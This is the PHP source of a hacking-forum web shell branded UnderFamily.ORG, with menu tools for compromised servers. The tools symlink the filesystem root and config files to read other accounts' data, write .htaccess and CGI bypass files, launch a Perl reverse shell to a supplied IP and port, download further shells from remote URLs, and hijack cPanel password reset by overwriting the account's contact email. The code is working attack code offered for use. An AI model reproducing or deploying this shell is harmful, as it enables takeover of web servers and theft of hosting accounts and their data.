<html>
<head>
<title>UnderFamily.ORG / Tools Shell</title>
<link href="https://bootswatch.com/4/cyborg/bootstrap.css" rel="stylesheet">
</head>
<center>
<body bgcolor="black">
	<img width="%90" title="hack forum" src="https://resmim.net/f/491SDI.png">
        <br><br>
        <font color="white">
        <a href="?home"><button class="btn btn-outline-primary btn-md" type="submit"><font color="white">HOME</button></a>&nbsp;
        <a href="?autoc1"><button class="btn btn-outline-primary btn-md" type="submit"><font color="white">AUTO C1</button></a>&nbsp;
        <a href="?cgi"><button class="btn btn-outline-primary btn-md" type="submit"><font color="white">CGI CREATOR</button></a>&nbsp;
        <a href="?symlink"><button class="btn btn-outline-primary btn-md" type="submit"><font color="white">PHP SYMLINK</button></a>&nbsp;
        <a href="?backconnect"><button class="btn btn-outline-primary btn-md" type="submit"><font color="white">BACKCONNECT</button></a>&nbsp;
        <a href="?getfile"><button class="btn btn-outline-primary btn-md" type="submit"><font color="white">GET FILE CREATOR</button></a>&nbsp;
        <a href="?cpanelcracker"><button class="btn btn-outline-primary btn-md" type="submit"><font color="white">CPANEL CRACKER</button></a>&nbsp;
        <a href="?about"><button class="btn btn-outline-primary btn-md" type="submit"><font color="white">ABOUT</button></a>
        <br>
        <br>
<?php
//CONFIGURATION
$htaccessc1 = file_get_contents("https://raw.githubusercontent.com/underfamily/underfamily.github.io/master/htaccess-c1.txt");
$htaccesscgi = file_get_contents("https://raw.githubusercontent.com/underfamily/underfamily.github.io/master/htaccess-cgi.txt");
$izocgi = file_get_contents("https://raw.githubusercontent.com/underfamily/underfamily.github.io/master/izocin.txt");
$backconn = file_get_contents("https://raw.githubusercontent.com/underfamily/underfamily.github.io/master/back.txt");

//HOME
if(isset($_GET["home"])) {
echo '<h2>Select tool is a menubar.</h2>';
}

//AUTO C1
if(isset($_GET["autoc1"])) {
echo "<a href='c1/1'><button class='btn btn-secondary' type='submit'>CLICK C1</button></a>";
mkdir("c1");
chdir("c1");
@exec('ln -s / 1');
@symlink('/', '1');
$htaccess = fopen('.htaccess', 'w+'); 
fwrite($htaccess, $htaccessc1); 
fclose($htaccess);
}

//CGI CREATOR
if(isset($_GET["cgi"])) {
echo '<iframe src="cgi/izo.cin" style="width: 100%;min-height: 600px;background: #FFFFFF;border: 1px solid #250000;" sandbox="allow-same-origin allow-scripts allow-forms"></iframe>';
mkdir("cgi");
chdir("cgi");
$htaccess2 = fopen('.htaccess', 'w+'); 
fwrite($htaccess2, $htaccesscgi); 
fclose($htaccess2);

$cgi = fopen('izo.cin', 'w+'); 
fwrite($cgi, $izocgi); 
fclose($cgi);
}

//PHP SYMLINK
if(isset($_GET["symlink"])) {
echo '
<form action="" method="POST">
Symlink dir:<input type="text" name="symlink-dir" value="/home/underfamily/public_html/config.php">
<br>
Symlink name:<input type="text" name="symlink-name" value="symlink.txt">
<br>
<button class="btn btn-secondary" name="sym" type="submit">SYMLINK</button>
';
if(isset($_POST["sym"])) {
mkdir("symlinks");
chdir("symlinks");
$dir = $_POST["symlink-dir"];
$name = $_POST["symlink-name"];
@symlink($dir, $name);
echo "<a href='symlinks/".$name."'>".$name." Symlinked";
}
}

//BACKCONNECT
if(isset($_GET["backconnect"])) {
echo '
<form action="" method="POST">
Ip Adress:<input type="text" name="ip" value="'.$_SERVER['REMOTE_ADDR'].'">
<br>
Port:<input type="text" name="port">
<br>
<button class="btn btn-secondary" type="submit" name="bc">BACKCONNECT</button>
</form>
';
if(isset($_POST["bc"])) {
echo 'Backconnected';
$b_ip = $_POST["ip"];
$b_port = $_POST["port"];
mkdir("bc");
chdir("bc");
$bc = fopen('back.pl', 'w+'); 
fwrite($bc, $backconn); 
fclose($bc);
@exec('perl back.pl '.$b_ip.' '.$b_port.'');
}
}

//GET FILE CREATOR
if(isset($_GET["getfile"])) {
echo '
<form action="" method="POST">
Shell URL:<input type="text" name="url" value="https://underfamily.com/shell.txt">
<br>
New file name:<input type="text" name="newname" value="underfamily.php">
<br>
<button class="btn btn-secondary" type="submit" name="getf">GET FILE</button>
</form>
';
if(isset($_POST["getf"])) {
$url = $_POST["url"];
$newname = $_POST["newname"];
$urlget = file_get_contents($url);
echo 'File created => <a href="'.$newname.'">'.$newname.'</a>';
$getnewfile = fopen($newname, 'w+'); 
fwrite($getnewfile, $urlget); 
fclose($getnewfile);
}
}

//CPANEL CRACKER(STIGMA-0)
if(isset($_GET["cpanelcracker"])) {
echo '
<form action="#" method="post">
    Mail:<input type="email" name="email"/>
    <input type="submit" class="btn btn-secondary" name="submit" value="Send"/>
    </form>
';

$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');

if(isset($_POST['submit'])){
    
    $email = $_POST['email'];
    $wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
fwrite($f, $wr);
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'w');
fwrite($f, $wr);
fclose($f);
$parm = $site.':2083/resetpass?start=1';
echo '<br/><center>'.$parm.'</center>';
}
}

//ABOUT(Don't Edit)
if(isset($_GET["about"])) {
echo '
Shell coded => UnderFamily.ORG(OMEGA-0)
<br>
Shell Original Code => <a href="https://underfamily.org/forum/">UnderFamily.ORG</a>
';
}

//underfamily.org
?>
